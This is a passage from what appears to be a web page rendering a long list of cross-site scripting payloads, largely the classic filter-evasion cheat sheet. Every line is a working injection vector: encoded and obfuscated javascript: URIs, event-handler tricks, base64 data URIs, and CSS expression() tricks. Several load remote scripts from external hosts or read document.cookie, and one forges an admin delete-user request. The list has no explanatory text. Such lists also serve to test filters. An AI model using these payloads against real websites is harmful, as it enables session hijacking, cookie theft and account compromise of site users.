ascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br><span class="line">&lt;IMG SRC=&quot;jav&amp;#x09;ascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br><span class="line">&lt;IMG SRC=&quot;jav&amp;#x0A;ascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br><span class="line">&lt;IMG SRC=&quot;jav&amp;#x0D;ascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br><span class="line">perl -e &apos;print &quot;&lt;IMG SRC=java\0script:alert(\&quot;XSS\&quot;)&gt;&quot;;&apos; &gt; out</span><br><span class="line">&lt;IMG SRC=&quot; &amp;#14;  javascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br><span class="line">&lt;SCRIPT/XSS SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;</span><br><span class="line">&lt;SCRIPT/SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);//&lt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;SCRIPT SRC=http://ha.ckers.org/xss.js?&lt; B &gt;</span><br><span class="line">&lt;SCRIPT SRC=//ha.ckers.org/.j&gt;</span><br><span class="line">&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;</span><br><span class="line">&lt;iframe src=http://ha.ckers.org/scriptlet.html &lt;</span><br><span class="line">\&quot;;alert(&apos;XSS&apos;);//</span><br><span class="line">&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);&lt;/SCRIPT&gt;</span><br><span class="line">&lt;INPUT TYPE=&quot;IMAGE&quot; SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br><span class="line">&lt;BODY BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</span><br><span class="line">&lt;IMG DYNSRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</span><br><span class="line">&lt;IMG LOWSRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</span><br><span class="line">&lt;STYLE&gt;li &#123;list-style-image: url(&quot;javascript:alert(&apos;XSS&apos;)&quot;);&#125;&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS&lt;/br&gt;</span><br><span class="line">&lt;IMG SRC=&apos;vbscript:msgbox(&quot;XSS&quot;)&apos;&gt;</span><br><span class="line">&lt;IMG SRC=&quot;livescript:[code]&quot;&gt;</span><br><span class="line">&lt;BODY ONLOAD=alert(&apos;XSS&apos;)&gt;</span><br><span class="line">&lt;BGSOUND SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br><span class="line">&lt;BR SIZE=&quot;&amp;&#123;alert(&apos;XSS&apos;)&#125;&quot;&gt;</span><br><span class="line">&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br><span class="line">&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;http://ha.ckers.org/xss.css&quot;&gt;</span><br><span class="line">&lt;STYLE&gt;@import&apos;http://ha.ckers.org/xss.css&apos;;&lt;/STYLE&gt;</span><br><span class="line">&lt;META HTTP-EQUIV=&quot;Link&quot; Content=&quot;&lt;http://ha.ckers.org/xss.css&gt;; REL=stylesheet&quot;&gt;</span><br><span class="line">&lt;STYLE&gt;BODY&#123;-moz-binding:url(&quot;http://ha.ckers.org/xssmoz.xml#xss&quot;)&#125;&lt;/STYLE&gt;</span><br><span class="line">&lt;STYLE&gt;@im\port&apos;\ja\vasc\ript:alert(&quot;XSS&quot;)&apos;;&lt;/STYLE&gt;</span><br><span class="line">&lt;IMG STYLE=&quot;xss:expr/*XSS*/ession(alert(&apos;XSS&apos;))&quot;&gt;</span><br><span class="line">exp/*&lt;A STYLE=&apos;no\xss:noxss(&quot;*//*&quot;);xss:ex/*XSS*//*/*/pression(alert(&quot;XSS&quot;))&apos;&gt;</span><br><span class="line">&lt;STYLE TYPE=&quot;text/javascript&quot;&gt;alert(&apos;XSS&apos;);&lt;/STYLE&gt;</span><br><span class="line">&lt;STYLE&gt;.XSS&#123;background-image:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;);&#125;&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;</span><br><span class="line">&lt;STYLE type=&quot;text/css&quot;&gt;BODY&#123;background:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;)&#125;&lt;/STYLE&gt;</span><br><span class="line">&lt;STYLE type=&quot;text/css&quot;&gt;BODY&#123;background:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;)&#125;&lt;/STYLE&gt;</span><br><span class="line">&lt;XSS STYLE=&quot;xss:expression(alert(&apos;XSS&apos;))&quot;&gt;</span><br><span class="line">&lt;XSS STYLE=&quot;behavior: url(xss.htc);&quot;&gt;</span><br><span class="line">¼script¾alert(¢XSS¢)¼/script¾</span><br><span class="line">&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br><span class="line">&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K&quot;&gt;</span><br><span class="line">&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0; URL=http://;URL=javascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br><span class="line">&lt;IFRAME SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/IFRAME&gt;</span><br><span class="line">&lt;IFRAME SRC=# onmouseover=&quot;alert(document.cookie)&quot;&gt;&lt;/IFRAME&gt;</span><br><span class="line">&lt;FRAMESET&gt;&lt;FRAME SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/FRAMESET&gt;</span><br><span class="line">&lt;TABLE BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</span><br><span class="line">&lt;TABLE&gt;&lt;TD BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</span><br><span class="line">&lt;DIV STYLE=&quot;background-image: url(javascript:alert(&apos;XSS&apos;))&quot;&gt;</span><br><span class="line">&lt;DIV STYLE=&quot;background-image:\0075\0072\006C\0028&apos;\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029&apos;\0029&quot;&gt;</span><br><span class="line">&lt;DIV STYLE=&quot;background-image: url(&amp;#1;javascript:alert(&apos;XSS&apos;))&quot;&gt;</span><br><span class="line">&lt;DIV STYLE=&quot;width: expression(alert(&apos;XSS&apos;));&quot;&gt;</span><br><span class="line">&lt;BASE HREF=&quot;javascript:alert(&apos;XSS&apos;);//&quot;&gt;</span><br><span class="line"> &lt;OBJECT TYPE=&quot;text/x-scriptlet&quot; DATA=&quot;http://ha.ckers.org/scriptlet.html&quot;&gt;&lt;/OBJECT&gt;</span><br><span class="line">&lt;EMBED SRC=&quot;data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==&quot; type=&quot;image/svg+xml&quot; AllowScriptAccess=&quot;always&quot;&gt;&lt;/EMBED&gt;</span><br><span class="line">&lt;SCRIPT SRC=&quot;http://ha.ckers.org/xss.jpg&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;!--#exec cmd=&quot;/bin/echo &apos;&lt;SCR&apos;&quot;--&gt;&lt;!--#exec cmd=&quot;/bin/echo &apos;IPT SRC=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;&apos;&quot;--&gt;</span><br><span class="line">&lt;? echo(&apos;&lt;SCR)&apos;;echo(&apos;IPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&apos;); ?&gt;</span><br><span class="line">&lt;IMG SRC=&quot;http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode&quot;&gt;</span><br><span class="line">Redirect 302 /a.jpg http://victimsite.com/admin.asp&amp;deleteuser</span><br><span class="line">&lt;META HTTP-EQUIV=&quot;Set-Cookie&quot; Content=&quot;USERID=&lt;SCRIPT&gt;alert(&apos;XSS&apos;)&lt;/SCRIPT&gt;&quot;&gt;</span><br><span class="line"> &lt;HEAD&gt;&lt;META HTTP-EQUIV=&quot;CONTENT-TYPE&quot; CONTENT=&quot;text/html; charset=UTF-7&quot;&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert(&apos;XSS&apos;);+ADw-/SCRIPT+AD4-</span><br><span class="line">&lt;SCRIPT a=&quot;&gt;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;SCRIPT =&quot;&gt;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;SCRIPT a=&quot;&gt;&quot; &apos;&apos; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;SCRIPT &quot;a=&apos;&gt;&apos;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;SCRIPT a=`&gt;` SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;SCRIPT a=&quot;&gt;&apos;&gt;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;A HREF=&quot;http://66.102.7.147/&quot;&gt;XSS&lt;/A&gt;</span><br><span class="line">&lt;A HREF=&quot;http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D&quot;&gt;XSS&lt;/A&gt;</span><br><span class="line">&lt;A HREF=&quot;http://1113982867/&quot;&gt;XSS&lt;/A&gt;</span><br><span class="line">&lt;A HREF=&quot;http://0x42.0x0000066.0x7.0x93/&quot;&gt;XSS&lt;/A&gt;</span><br><span class="line">&lt;A HREF=&quot;http://0102.0146.0007.00000223/&quot;&gt;XSS&lt;/A&gt;</span><br><span class="line">&lt;A HREF=&quot;htt p://6 6.000146.0x7.147/&quot;&gt;XSS&lt;/A&gt;</span><br><span class="line">&lt;iframe  src=&quot;&amp;Tab;javascript:prompt(1)&amp;Tab;&quot;&gt;</span><br><span class="line">&lt;svg&gt;&lt;style&gt;&#123;font-family&amp;colon;&apos;&lt;iframe/onload=confirm(1)&gt;&apos;</span><br><span class="line">&lt;input/onmouseover=&quot;javaSCRIPT&amp;colon;confirm&amp;lpar;1&amp;rpar;&quot;</span><br><span class="line">&lt;sVg&gt;&lt;scRipt &gt;alert&amp;lpar;1&amp;rpar; &#123;Opera&#125;</span><br><span class="line">&lt;img/src=`` onerror=this.onerror=confirm(1)</span><br><span class="line">&lt;form&gt;&lt;isindex formaction=&quot;javascript&amp;colon;confirm(1)&quot;</span><br><span class="line">&lt;img src=``&amp;NewLine; onerror=alert(1)&amp;NewLine;</span><br><span class="line">&lt;script/&amp;Tab; src=&apos;https://dl.dropbox.com/u/13018058/js.js&apos; /&amp;Tab;&gt;&lt;/script&gt;</span><br><span class="line">&lt;ScRipT 5-0*3+9/3=&gt;prompt(1)&lt;/ScRipT giveanswerhere=?</span><br><span class="line">&lt;iframe/src=&quot;data:text/html;&amp;Tab;base64&amp;Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==&quot;&gt;</span><br><span class="line">&lt;script /**/&gt;/**/alert(1)/**/&lt;/script /**/</span><br><span class="line">&amp;#34;&amp;#62;&lt;h1/onmouseover=&apos;\u0061lert(1)&apos;&gt;</span><br><span class="line">&lt;iframe/src=&quot;data:text/html,&lt;svg &amp;#111;&amp;#110;load=alert(1)&gt;&quot;&gt;</span><br><span class="line">&lt;meta content=&quot;&amp;NewLine; 1 &amp;NewLine;; JAVASCRIPT&amp;colon; alert(1)&quot; http-equiv=&quot;refresh&quot;/&gt;</span><br><span class="line">&lt;svg&gt;&lt;script xlink:href=data&amp;colon;,window.open(&apos;https://www.google.com/&apos;)&gt;&lt;/script</span><br><span class="line">&lt;svg&gt;&lt;script x:href=&apos;https://dl.dropbox.com/u/13018058/js.js&apos; &#123;Opera&#125;</span><br><span class="line">&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;url=javascript:confirm(1)&quot;&gt;</span><br><span class="line">&lt;iframe src=javascript&amp;colon;alert&amp;lpar;document&amp;period;location&amp;rpar;&gt;</span><br><span class="line">&lt;form&gt;&lt;a href=&quot;javascript:\u0061lert&amp;#x28;1&amp;#x29;&quot;&gt;X</span><br><span class="line">&lt;/script&gt;&lt;img/*/src=&quot;worksinchrome&amp;colon;prompt&amp;#x28;1&amp;#x29;&quot;/*/onerror=&apos;eval(src)&apos;&gt;</span><br><span class="line">&lt;img/&amp;#09;&amp;#10;&amp;#11; src=`~` onerror=prompt(1)&gt;</span><br><span class="line">&lt;form&gt;&lt;iframe &amp;#09;&amp;#10;&amp;#11; src=&quot;javascript&amp;#58;alert(1)&quot;&amp;#11;&amp;#10;&amp;#09;;&gt;</span><br><span class="line">&lt;a href=&quot;data:application/x-x509-user-cert;&amp;NewLine;base64&amp;NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&amp;#09;&amp;#10;&amp;#11;&gt;X&lt;/a</span><br><span class="line">http://www.google&lt;script .com&gt;alert(document.location)&lt;/script</span><br><span class="line">&lt;a&amp;#32;href&amp;#61;&amp;#91;&amp;#00;&amp;#93;&quot;&amp;#00; onmouseover=prompt&amp;#40;1&amp;#41;&amp;#47;&amp;#47;&quot;&gt;XYZ&lt;/a</span><br><span class="line">&lt;img/src=@&amp;#32;&amp;#13; onerror = prompt(&apos;&amp;#49;&apos;)</span><br><span class="line">&lt;style/onload=prompt&amp;#40;&apos;&amp;#88;&amp;#83;&amp;#83;&apos;&amp;#41;</span><br><span class="line">&lt;script ^__^&gt;alert(String.fromCharCode(49))&lt;/script ^__^</span><br><span class="line">&lt;/style &amp;#32;&gt;&lt;script &amp;#32; :-(&gt;/**/alert(document.location)/**/&lt;/script &amp;#32; :-(</span><br><span class="line">&amp;#00;&lt;/form&gt;&lt;input type&amp;#61;&quot;date&quot; onfocus=&quot;alert(1)&quot;&gt;</span><br><span class="line">&lt;form&gt;&lt;textarea &amp;#13; onkeyup=&apos;\u0061\u006C\u0065\u0072\u0074&amp;#x28;1&amp;#x29;&apos;&gt;</span><br><span class="line">&lt;script /***/&gt;/***/confirm(&apos;\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450&apos;)/***/&lt;/script /***/</span><br><span class="line">&lt;iframe srcdoc=&apos;&amp;lt;body onload=prompt&amp;lpar;1&amp;rpar;&amp;gt;&apos;&gt;</span><br><span class="line">&lt;a href=&quot;javascript:void(0)&quot; onmouseover=&amp;NewLine;javascript:alert(1)&amp;NewLine;&gt;X&lt;/a&gt;</span><br><span class="line">&lt;script ~~~&gt;alert(0%0)&lt;/script ~~~&gt;</span><br><span class="line">&lt;style/onload=&amp;lt;!--&amp;#09;&amp;gt;&amp;#10;alert&amp;#10;&amp;lpar;1&amp;rpar;&gt;</span><br><span class="line">&lt;///style///&gt;&lt;span %2F onmousemove=&apos;alert&amp;lpar;1&amp;rpar;&apos;&gt;SPAN</span><br><span class="line">&lt;img/src=&apos;http://i.imgur.com/P8mL8.jpg&apos; onmouseover=&amp;Tab;prompt(1)</span><br><span class="line">&amp;#34;&amp;#62;&lt;svg&gt;&lt;style&gt;&#123;-o-link-source&amp;colon;&apos;&lt;body/onload=confirm(1)&gt;&apos;</span><br><span class="line">&amp;#13;&lt;blink/&amp;#13; onmouseover=pr&amp;#x6F;mp&amp;#116;(1)&gt;OnMouseOver &#123;Firefox &amp; Opera&#125;</span><br><span class="line">&lt;marquee onstart=&apos;javascript:alert&amp;#x28;1&amp;#x29;&apos;&gt;^__^</span><br><span class="line">&lt;div/style=&quot;width:expression(confirm(1))&quot;&gt;X&lt;/div&gt; &#123;IE7&#125;</span><br><span class="line">&lt;iframe// src=javaSCRIPT&amp;colon;alert(1)</span><br><span class="line">//&lt;form/action=javascript&amp;#x3A;alert&amp;lpar;document&amp;period;cookie&amp;rpar;&gt;&lt;input/type=&apos;submit&apos;&gt;//</span><br><span class="line">/*iframe/src*/&lt;iframe/src=&quot;&lt;iframe/src=@&quot;/onload=prompt(1) /*iframe/src*/&gt;</span><br><span class="line">//|\\ &lt;script //|\\ src=&apos;https://dl.dropbox.com/u/13018058/js.js&apos;&gt; //|\\ &lt;/script //|\\</span><br><span class="line">&lt;/font&gt;/&lt;svg&gt;&lt;style&gt;&#123;src&amp;#x3A;&apos;&lt;style/onload=this.onload=confirm(1)&gt;&apos;&lt;/font&gt;/&lt;/style&gt;</span><br><span class="line">&lt;a/href=&quot;javascript:&amp;#13; javascript:prompt(1)&quot;&gt;&lt;input type=&quot;X&quot;&gt;</span><br><span class="line">&lt;/plaintext\&gt;&lt;/|\&gt;&lt;plaintext/onmouseover=prompt(1)</span><br><span class="line">&lt;/svg&gt;&apos;&apos;&lt;svg&gt;&lt;script &apos;AQuickBrownFoxJumpsOverTheLazyDog&apos;&gt;alert&amp;#x28;1&amp;#x29; &#123;Opera&#125;</span><br><span class="line">&lt;a href=&quot;javascript&amp;colon;\u0061&amp;#x6C;&amp;#101%72t&amp;lpar;1&amp;rpar;&quot;&gt;&lt;button&gt;</span><br><span class="line">&lt;div onmouseover=&apos;alert&amp;lpar;1&amp;rpar;&apos;&gt;DIV&lt;/div&gt;</span><br><span class="line">&lt;iframe style=&quot;position:absolute;top:0;left:0;width:100%;height:100%&quot; onmouseover=&quot;prompt(1)&quot;&gt;</span><br><span class="line">&lt;a href=&quot;jAvAsCrIpT&amp;colon;alert&amp;lpar;1&amp;rpar;&quot;&gt;X&lt;/a&gt;</span><br><span class="line">&lt;embed src=&quot;http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf&quot;&gt;</span><br><span class="line">&lt;object data=&quot;http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf&quot;&gt;</span><br><span class="line">&lt;var onmouseover=&quot;prompt(1)&quot;&gt;On Mouse Over&lt;/var&gt;</span><br><span class="line">&lt;a href=javascript&amp;colon;alert&amp;lpar;document&amp;period;cookie&amp;rpar;&gt;Click Here&lt;/a&gt;</span><br><span class="line">&lt;img src=&quot;/&quot; =_=&quot; title=&quot;onerror=&apos;prompt(1)&apos;&quot;&gt;</span><br><span class="line">&lt;%&lt;!--&apos;%&gt;&lt;script&gt;alert(1);&lt;/script --&gt;</span><br><span class="line">&lt;script src=&quot;data:text/javascript,alert(1)&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;iframe/src \/\/onload = prompt(1)</span><br><span class="line">&lt;iframe/onreadystatechange=alert(1)</span><br><span class="line">&lt;svg/onload=alert(1)</span><br><span class="line">&lt;input value=&lt;&gt;&lt;iframe/src=javascript:confirm(1)</span><br><span class="line">&lt;input type=&quot;text&quot; value=`` &lt;div/onmouseover=&apos;alert(1)&apos;&gt;X&lt;/div&gt;</span><br><span class="line">http://www.&lt;script&gt;alert(1)&lt;/script .com</span><br><span class="line">&lt;iframe src=j&amp;NewLine;&amp;Tab;a&amp;NewLine;&amp;Tab;&amp;Tab;v&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;a&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;s&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;c&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;r&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;i&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;p&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;t&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;colon;a&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;l&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;e&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;r&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;t&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;28&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;1&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;%29&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;svg&gt;&lt;script ?&gt;alert(1)</span><br><span class="line">&lt;iframe src=j&amp;Tab;a&amp;Tab;v&amp;Tab;a&amp;Tab;s&amp;Tab;c&amp;Tab;r&amp;Tab;i&amp;Tab;p&amp;Tab;t&amp;Tab;:a&amp;Tab;l&amp;Tab;e&amp;Tab;r&amp;Tab;t&amp;Tab;%28&amp;Tab;1&amp;Tab;%29&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;img src=`xx:xx`onerror=alert(1)&gt;</span><br><span class="line">&lt;object type=&quot;text/x-scriptlet&quot; data=&quot;http://jsfiddle.net/XLE63/ &quot;&gt;&lt;/object&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;javascript&amp;colon;alert(1)&quot;/&gt;</span><br><span class="line">&lt;math&gt;&lt;a xlink:href=&quot;//jsfiddle.net/t846h/&quot;&gt;click</span><br><span class="line">&lt;embed code=&quot;http://businessinfo.co.uk/labs/xss/xss.swf&quot; allowscriptaccess=always&gt;</span><br><span class="line">&lt;svg contentScriptType=text/vbs&gt;&lt;script&gt;MsgBox+1</span><br><span class="line">&lt;a href=&quot;data:text/html;base64_,&lt;svg/onload=\u0061&amp;#x6C;&amp;#101%72t(1)&gt;&quot;&gt;X&lt;/a</span><br><span class="line">&lt;iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074(&apos;\u0061&apos;) worksinIE&gt;</span><br><span class="line">&lt;script&gt;~&apos;\u0061&apos; ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~&apos;\u0061&apos;)&lt;/script U+</span><br><span class="line">&lt;script/src=&quot;data&amp;colon;text%2Fj\u0061v\u0061script,\u0061lert(&apos;\u0061&apos;)&quot;&gt;&lt;/script a=\u0061 &amp; /=%2F</span><br><span class="line">&lt;script/src=data&amp;colon;text/j\u0061v\u0061&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116,\u0061%6C%65%72%74(/XSS/)&gt;&lt;/script</span><br><span class="line">&lt;object data=javascript&amp;colon;\u0061&amp;#x6C;&amp;#101%72t(1)&gt;</span><br><span class="line">&lt;script&gt;+-+-1-+-+alert(1)&lt;/script&gt;</span><br><span class="line">&lt;body/onload=&amp;lt;!--&amp;gt;&amp;#10alert(1)&gt;</span><br><span class="line">&lt;script itworksinallbrowsers&gt;/*&lt;script* */alert(1)&lt;/script</span><br><span class="line">&lt;img src ?itworksonchrome?\/onerror = alert(1)</span><br><span class="line">&lt;svg&gt;&lt;script&gt;//&amp;NewLine;confirm(1);&lt;/script &lt;/svg&gt;</span><br><span class="line">&lt;svg&gt;&lt;script onlypossibleinopera:-)&gt; alert(1)</span><br><span class="line">&lt;a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&amp;#97v&amp;#97script&amp;#x3A;&amp;#97lert(1)&gt;ClickMe</span><br><span class="line">&lt;script x&gt; alert(1) &lt;/script 1=2</span><br><span class="line">&lt;div/onmouseover=&apos;alert(1)&apos;&gt; style=&quot;x:&quot;&gt;</span><br><span class="line">&lt;--`&lt;img/src=` onerror=alert(1)&gt; --!&gt;</span><br><span class="line">&lt;script/src=&amp;#100&amp;#97&amp;#116&amp;#97:text/&amp;#x6a&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x000070&amp;#x074,&amp;#x0061;&amp;#x06c;&amp;#x0065;&amp;#x00000072;&amp;#x00074;(1)&gt;&lt;/script&gt;</span><br><span class="line">&lt;div style=&quot;position:absolute;top:0;left:0;width:100%;height:100%&quot; onmouseover=&quot;prompt(1)&quot; onclick=&quot;alert(1)&quot;&gt;x&lt;/button&gt;</span><br><span class="line">&quot;&gt;&lt;img src=x onerror=window.open(&apos;https://www.google.com/&apos;);&gt;</span><br><span class="line">&lt;form&gt;&lt;button formaction=javascript&amp;colon;alert(1)&gt;CLICKME</span><br><span class="line">&lt;math&gt;&lt;a xlink:href=&quot;//jsfiddle.net/t846h/&quot;&gt;click</span><br><span class="line">&lt;object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+&gt;&lt;/object&gt;</span><br><span class="line">&lt;iframe src=&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;a href=&quot;data:text/html;blabla,&amp;#60&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#32&amp;#115&amp;#114&amp;#99&amp;#61&amp;#34&amp;#104&amp;#116&amp;#116&amp;#112&amp;#58&amp;#47&amp;#47&amp;#115&amp;#116&amp;#101&amp;#114&amp;#110&amp;#101&amp;#102&amp;#97&amp;#109&amp;#105&amp;#108&amp;#121&amp;#46&amp;#110&amp;#101&amp;#116&amp;#47&amp;#102&amp;#111&amp;#111&amp;#46&amp;#106&amp;#115&amp;#34&amp;#62&amp;#60&amp;#47&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#62&amp;#8203&quot;&gt;Click Me&lt;/a&gt;</span><br><span class="line">&quot;&gt;&lt;script&gt;&quot;</span><br><span class="line">&lt;script&gt;alert(&quot;WXSS&quot;)&lt;/script&gt;</span><br><span class="line">&lt;&lt;script&gt;alert(&quot;WXSS&quot;);//&lt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line">&apos;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line">&apos;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;</span><br><span class="line">\&quot;;alert(&apos;XSS&apos;);//</span><br><span class="line">%3cscript%3ealert(&quot;WXSS&quot;);%3c/script%3e</span><br><span class="line">%3cscript%3ealert(document.cookie);%3c%2fscript%3e</span><br><span class="line">%3Cscript%3Ealert(%22X%20SS%22);%3C/script%3E</span><br><span class="line">&amp;ltscript&amp;gtalert(document.cookie);&lt;/script&gt;</span><br><span class="line">&amp;ltscript&amp;gtalert(document.cookie);&amp;ltscript&amp;gtalert</span><br><span class="line">&lt;xss&gt;&lt;script&gt;alert(&apos;WXSS&apos;)&lt;/script&gt;&lt;/vulnerable&gt;</span><br><span class="line">&lt;IMG%20SRC=&apos;javascript:alert(document.cookie)&apos;&gt;</span><br><span class="line">&lt;IMG%20SRC=&quot;javascript:alert(&apos;WXSS&apos;);&quot;&gt;</span><br><span 